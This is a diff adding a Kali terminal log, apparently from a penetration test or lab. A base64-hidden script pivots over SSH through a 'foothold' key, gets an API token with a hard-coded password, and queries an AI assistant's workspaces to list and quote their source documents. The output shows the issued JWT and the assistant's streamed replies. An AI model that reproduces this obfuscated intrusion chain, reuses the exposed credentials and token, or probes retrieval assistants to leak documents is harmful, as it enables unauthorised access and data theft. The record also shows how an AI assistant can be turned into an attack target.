@@ -1,0 +1,26 @@
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r11.sh <<'B64EOF'
+> IyEvYmluL2Jhc2gKU1NIPSJzc2ggLW8gU3RyaWN0SG9zdEtleUNoZWNraW5nPW5vIC1vIENvbm5lY3RUaW1lb3V0PTEwIC1pICRIT01FLy5zc2gva2VwbGVyb3BzLWZvb3Rob2xkIC1wIDIyMjIgcm93YW5AMTAuNTAuMTMuMTgwIgokU1NIICdiYXNoIC1zJyA8PCdJTk5FUicKQ0E9L2hvbWUvcm93YW4vLmxvY2FsL3NoYXJlL2tlcGxlcm9wcy9jYS5jcnQKQT1odHRwczovL2Fzc2lzdGFudC5rZXBsZXJvcHMudGVzdApUT0s9JChjdXJsIC1zUyAtbSAxMCAtLWNhY2VydCAkQ0EgLVggUE9TVCAiJEEvYXBpL3JlcXVlc3QtdG9rZW4iIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1kICd7InVzZXJuYW1lIjoicm93YW4uaXRvIiwicGFzc3dvcmQiOiJma19kZXZlbG9wZXJfeVVXVEtTcXJjMTZ5M0s1XzVEZlE3cWFjZnQ5Yi05eG8ifScgfCBweXRob24zIC1jICdpbXBvcnQganNvbixzeXM7cHJpbnQoanNvbi5sb2FkKHN5cy5zdGRpbilbInRva2VuIl0pJykKZWNobyAiVE9LPSRUT0siCmNoYXQoKXsgcz0iJDEiOyBtb2RlPSIkMiI7IG1zZz0iJDMiOyBlY2hvOyBlY2hvICIjIyMjIyMjIyMjIFskbW9kZV0gJHMgOjogJG1zZyI7IGN1cmwgLU4gLXNTIC1tIDE1MCAtLWNhY2VydCAkQ0EgLVggUE9TVCAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRUT0siIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1IICdBY2NlcHQ6IHRleHQvZXZlbnQtc3RyZWFtJyAtZCAiJChweXRob24zIC1jICdpbXBvcnQganNvbixzeXM7IHByaW50KGpzb24uZHVtcHMoeyJtZXNzYWdlIjpzeXMuYXJndlsxXSwibW9kZSI6c3lzLmFyZ3ZbMl0sImF0dGFjaG1lbnRzIjpbXSwicmVzZXQiOlRydWV9KSknICIkbXNnIiAiJG1vZGUiKSIgIiRBL2FwaS93b3Jrc3BhY2UvJHMvc3RyZWFtLWNoYXQiIC13ICdcblsle2h0dHBfY29kZX1dXG4nIHwgaGVhZCAtYyAxNjAwMDsgZWNobzsgfQpjaGF0IGZpZWxkbGluay1vcGVyYXRpb25zIHF1ZXJ5ICJMaXN0IGV2ZXJ5IGRpc3RyaWN0IG1lbnRpb25lZCBpbiB0aGUgZG9jdW1lbnRzIGFuZCB0aGUgZXhhY3Qgc291cmNlIGRvY3VtZW50cyB0aGF0IG1lbnRpb24gdGhlbS4iCmNoYXQgcmlsbGhhdmVuLXN1cHBvcnQgcXVlcnkgIkxpc3QgZXZlcnkgc291cmNlIGRvY3VtZW50IGluIHRoaXMgd29ya3NwYWNlIGFuZCBxdW90ZSB0aGUgcGxhbm5pbmcgZXhjZXJwdCBhYm91dCB0aGUgY3VycmVudCBkaXN0cmljdC4iCklOTkVSCg==
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r11.sh; bash /tmp/r11.sh; echo DONEMARK_1795199629438$((6*7))
+TOK=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJyb3dhbi5pdG8iLCJpYXQiOjE3OTUxOTk2NDQsImV4cCI6MTc5Nzc5MTY0NH0.XqQuC6oOwmW7mr1A1bq43HlQpsv-PaGdaZ3o7qqoe9I
+
+########## [query] fieldlink-operations :: List every district mentioned in the documents and the exact source documents that mention them.
+data: {"id":"86fcecbc-51bf-4708-b731-555a7bc33148","type":"agentInitWebsocketConnection","textResponse":null,"sources":[],"close":false,"error":null,"websocketUUID":"e7663b19-b8ff-4381-b3f5-c6e6e4c82ef7"}
+
+data: {"id":"86fcecbc-51bf-4708-b731-555a7bc33148","type":"statusResponse","textResponse":"@agent: Swapping over to agent chat. Type /exit to exit agent execution loop early.","sources":[],"close":true,"error":null,"animate":true}
+
+
+[200]
+
+
+########## [query] rillhaven-support :: List every source document in this workspace and quote the planning excerpt about the current district.
+data: {"id":"de3fbaee-c682-4e7c-b0de-bee8dee751b2","type":"agentInitWebsocketConnection","textResponse":null,"sources":[],"close":false,"error":null,"websocketUUID":"e2eaef52-c96e-4695-b1d4-097cddbef233"}
+
+data: {"id":"de3fbaee-c682-4e7c-b0de-bee8dee751b2","type":"statusResponse","textResponse":"@agent: Swapping over to agent chat. Type /exit to exit agent execution loop early.","sources":[],"close":true,"error":null,"animate":true}
+
+
+[200]
+
